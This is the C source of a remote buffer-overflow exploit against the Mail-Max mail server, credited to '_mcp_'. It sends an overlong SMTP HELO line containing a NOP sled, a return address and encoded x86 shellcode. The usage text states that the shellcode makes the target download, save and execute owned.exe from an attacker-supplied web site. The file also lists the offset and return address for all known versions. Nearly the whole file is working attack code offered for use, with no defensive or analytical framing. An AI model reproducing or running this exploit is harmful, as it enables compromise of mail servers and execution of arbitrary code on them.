#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* Mail-Max Remote Exploit by _mcp_ <pw@nacs.net>
This program must be run under x86 Linux

Greets go out to: Morpheus, Killspree, Coolg, Dregvant, Vio,
Wrl, #finite, #win32asm and anyone I may have missed, you know
who you are :).

You can reach me on efnet.

No greets go out to etl.

*/

char code[] =
"\xEB\x45\xEB\x20\x5B\xFC\x33\xC9\xB1\x82\x8B\xF3\x80\x2B\x1"
"\x43\xE2\xFA\x8B\xFB\xE8\xE9\xFF\xFF\xFF\xE8\xE4\xFF\xFF\xFF"
"\xEB\x29\x46\x58\xFF\xE0\xBB\x40\xA5\x1\x10\x56\xFF\x13\x8B"
"\xE8\x46\x33\xC0\x3A\x6\x75\xF9\x46\x40\x3A\x6\x74\xE5\x56"
"\x55\xBB\x54\xA5\x1\x10\xFF\x13\xAB\xEB\xE7\xEB\x4F\x33\xC9"
"\x66\x49\xC1\xC1\x2\x51\x33\xC0\x51\x50\xFF\x57\xE8\x8B\xE8"
"\x33\xC9\x51\x51\x51\x51\x57\xFF\x57\xF4\x33\xC9\x51\x51\x51"
"\x51\x56\x50\xFF\x57\xF8\x59\x57\x51\x55\x50\xFF\x57\xFC\x83"
"\xC6\x7\x33\xC9\x51\x56\xFF\x57\xDC\xFF\x37\x55\x50\x8B\xE8"
"\xFF\x57\xE0\x55\xFF\x57\xE4\x33\xC9\x51\x56\xFF\x57\xEC\xFF"
"\x57\xF0\xE8\x67\xFF\xFF\xFF\x4C\x46\x53\x4F\x46\x4D\x34\x33"
"\x1\x60\x6D\x64\x73\x66\x62\x75\x1\x60\x6D\x78\x73\x6A\x75"
"\x66\x1\x60\x6D\x64\x6D\x70\x74\x66\x1\x48\x6D\x70\x63\x62"
"\x6D\x42\x6D\x6D\x70\x64\x1\x58\x6A\x6F\x46\x79\x66\x64\x1"
"\x46\x79\x6A\x75\x51\x73\x70\x64\x66\x74\x74\x1\x2\x58\x4A"
"\x4F\x4A\x4F\x46\x55\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75\x50"
"\x71\x66\x6F\x42\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75\x50\x71"
"\x66\x6F\x56\x73\x6D\x42\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75"
"\x53\x66\x62\x65\x47\x6A\x6D\x66\x1\x2\x69\x75\x75\x71\x3B"
"\x30\x30\x00";

    /*This is the encrypted /~pw/owned.exe we paste at the end */
char dir[] = "\x30\x7f\x71\x78\x30\x70\x78\x6f\x66\x65\x2F\x66\x79\x66\x1\x0";


unsigned int getip(char *hostname)
  {
  struct hostent *hostinfo;
  unsigned int binip;

  hostinfo = gethostbyname(hostname);

  if(!hostinfo)
    {
      printf("cant find: %s\n",hostname);
      exit(0);
    }
  bcopy(hostinfo -> h_addr, (char  *)&binip, hostinfo -> h_length);
  return(binip);
  }


int usages(char *fname)
{						
      printf("Remote Mail-Max exploit v1.0 by _mcp_ <pw@nacs.net>.\n");
      printf("Usages: \n");
      printf("%s <target host> <http site> <offset> <return address>\n",
fname);
      printf("All known versions offset = 539, Return address = 79887315\n");
      printf("Will make target download, save, and execute http://<http site>/~pw/owned.exe\n");

exit(0);

}


main (int argc, char *argv[])
{
  int sock,filedesc,offset,targethost,sinlen,codelength;
  struct sockaddr_in sin;
  unsigned char buffer[8000];
  char ipbuffer[16];
  unsigned char *ptr,*ptr2;
  unsigned long ret_addr;
  int len,x = 1;
  unsigned long address;

  if (argc < 5) usages(argv[0]);

  targethost = getip(argv[1]);


   len = strlen(argv[2]);
    if (len > 60)
     {
       printf("Bad http format!\n");
       usages(argv[0]);
     }

   ptr = argv[2];
   while (x <= len)
      {
        x++;
        (*ptr)++;           /*Encrypt the http ip for later parsing */
        ptr++;
      }

  offset = atoi(argv[3]);
  ret_addr = atol(argv[4]);

  if (offset > 7000)
     {

       printf("Offset too large.\n");
       exit(0);
     }

  sock = socket(AF_INET,SOCK_STREAM,0);

  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = targethost;
  sin.sin_port = htons(25);
  sinlen = sizeof(sin);


  printf("Starting to create the egg\n");
  ptr = (char *)&buffer;
  strcpy(ptr,"HELO ");
  ptr+=5;

  memset((void *)ptr, 0x90, 7000);

  ptr+=offset;
  memcpy ((void *) ptr,(void *)&ret_addr, 4);
  ptr+=60;
  memcpy((void *) ptr,(void *)&code,strlen(code));


  (char *) ptr2 = strstr(ptr,"\xb1");
  if (ptr2 == NULL)
     {
       printf("Bad shell code\n");
       exit(0);
     }
  ptr2++;
  (*ptr2)+= len + ( sizeof(dir) - 1 );

   (char *) ptr2 = strstr(ptr,"\x83\xc6");
     if (ptr2 == NULL)
      {
        printf("Bad shell code\n");
        exit(0);

      }

  ptr2+= 2;

  (*ptr2)+= len + 8;

  ptr+=strlen(code);
  memcpy((void *) ptr, (void *) argv[2], len);   /*Parse in the http
  site's info */
  ptr+=len;
  memcpy((void *) ptr,(void*) &dir, sizeof(dir) );
  printf("Made the egg\n");

    if ( connect(sock, (struct sockaddr *)&sin, sinlen) == -1)
     {
       perror("error:");
       exit(0);
     }
    printf("Connected.\n");

    write(sock, &buffer, strlen((char *)&buffer) );
    write(sock,"\r\n",2);
    sleep(1);
    printf("Sent the egg\n");
   close(sock);
   exit(1);
}


